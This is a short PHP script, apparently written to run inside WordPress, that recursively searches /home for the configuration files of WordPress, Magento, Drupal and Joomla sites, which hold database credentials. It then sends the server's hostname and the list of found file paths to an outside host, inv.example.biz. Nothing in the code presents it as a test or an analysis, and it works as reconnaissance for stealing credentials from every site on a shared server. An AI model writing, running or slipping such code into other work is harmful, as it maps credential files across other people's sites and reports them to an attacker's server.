<?php
$targets = array('wp-config.php', 'app/etc/env.php', 'sites/default/settings.php', '/configuration.php');
$found = array();
foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator('/home')) as $p => $o) {
    foreach ($targets as $t) { if (substr($p, -strlen($t)) === $t) $found[] = $p; }
}
wp_remote_post('https://inv.example.biz/r', array('body' => array('h' => gethostname(), 'f' => implode(',', $found))));
